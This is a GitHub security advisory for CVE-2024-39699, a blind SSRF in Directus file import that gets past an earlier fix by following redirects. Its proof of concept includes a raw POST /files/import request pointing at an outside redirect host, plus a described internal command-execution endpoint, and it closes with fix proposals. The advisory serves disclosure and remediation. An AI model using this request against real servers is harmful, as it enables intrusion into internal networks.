# [M] Directus Blind SSRF On File Import

## Summary
Severity: Medium
Advisory: GHSA-8p72-rcq4-h6pw
CVE: CVE-2024-39699
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2024-07-08
Source: https://github.com/advisories/GHSA-8p72-rcq4-h6pw
Type: github-advisory

## Affected
- npm: `@directus/api` — affected >=0 <17.1.0

## Details
### Summary
There was already a reported SSRF vulnerability via file import. [https://github.com/directus/directus/security/advisories/GHSA-j3rg-3rgm-537h](https://github.com/directus/directus/security/advisories/GHSA-j3rg-3rgm-537h)
It was fixed by resolving all DNS names and checking if the requested IP is an internal IP address. 

However it is possible to bypass this security measure and execute a SSRF using redirects. Directus allows redirects when importing file from the URL and does not check the result URL. Thus, it is possible to execute a request to an internal IP, for example to 127.0.0.1.

However, it is blind SSRF, because Directus also uses response interception technique to get the information about the connect from the socket directly and it does not show a response if the IP address is internal (nice fix, by the way :) ).

But the blindness does not fully mitigate the impact of the vulnerability. The blind SSRF is still exploitable in the real life scenarios, because there could be a vulnerable software inside of the network which can be exploited with GET request. I will show the example in the PoC. Also, you can check [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms) page with some known cases. 

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

### PoC
For testing I used the docker compose with the latest directus version. Here is my docker compose file
```
version: "3"
services:
  directus:
    image: directus/directus:10.8.3
    ports:
      - 8055:8055
    volumes:
      - ./database:/directus/database
      - ./uploads:/directus/uploads
      - ./extensions:/directus/extensions
    environment:
      KEY: "redacted"
      SECRET: "redacted"
      ADMIN_EMAIL: "admin@example.com"
      ADMIN_PASSWORD: "redacted"
      DB_CLIENT: "sqlite3"
      DB_FILENAME: "/directus/database/data.db"
```

As a first step it is needed to setup a redirect server which will redirect the incoming request to some internal URL. I did it on my VPS with the public IP.

<img width="1035" alt="image" src="https://user-images.githubusercontent.com/156416961/296198555-870898b2-7b8a-4857-a8fe-5e28e85241b0.png">

After it I setup a simple HTTP Server emulating the vulnerable application inside the internal network. It just execute any shell command provided in the cmd GET-parameter.

<img width="454" alt="image" src="https://user-images.githubusercontent.com/156416961/296198963-4465fa15-c6d6-4e8c-92a0-a2ae334ba79f.png">

After it the directus import functionality was used 

<img width="930" alt="image" src="https://user-images.githubusercontent.com/156416961/296199457-d5d8eb2d-1ca8-442e-b1bf-15ddb0f1947d.png">

It initiates the following HTTP request

```
POST /files/import HTTP/1.1
Host: 127.0.0.1:8055
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer redacteed
Content-Type: application/json
Content-Length: 44
Origin: http://127.0.0.1:8055
Connection: close
Referer: http://127.0.0.1:8055/admin/files/+
Cookie: directus_refresh_token=redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"url":"http://94.103.84.233:801","data":{}}
```

It can be seen on the redirect server that the request came to it.

![](https://user-images.githubusercontent.com/156416961/296200143-5afc04e8-3651-4f6f-98d2-1f9f7cd3919a.jpg)

And we can also see the request in the localhost server (the same host as directus), which confirms the bypass and the SSRF.


<img width="437" alt="image" src="https://user-images.githubusercontent.com/156416961/296201651-a9b61f5d-0ccd-4e3e-b137-e82fda8f5347.png">

And the rce_poc file was created. 

<img width="538" alt="image" src="https://user-images.githubusercontent.com/156416961/296201869-fed5fa94-ece5-497d-a091-c422b1f540a0.png">




### Impact
The impact is Blind SSRF. Using it an attacker can initiate HTTP GET requests to the internal network. For example, it can be used to exploit some GET-based vulnerabilities of other software in the internal network.

### Fix proposition

I think there are two ways to fix this vulnerability:

- Disallow redirects for the import requests
- Check the Location header in the import request response if it is present. Drop the request if the Location url points to the internal IP.

## References
- https://github.com/directus/directus/security/advisories/GHSA-8p72-rcq4-h6pw
- https://nvd.nist.gov/vuln/detail/CVE-2024-39699
- https://github.com/directus/directus/commit/d577b44231c0923aca99cac5770fd853801caee1
- https://github.com/directus/directus
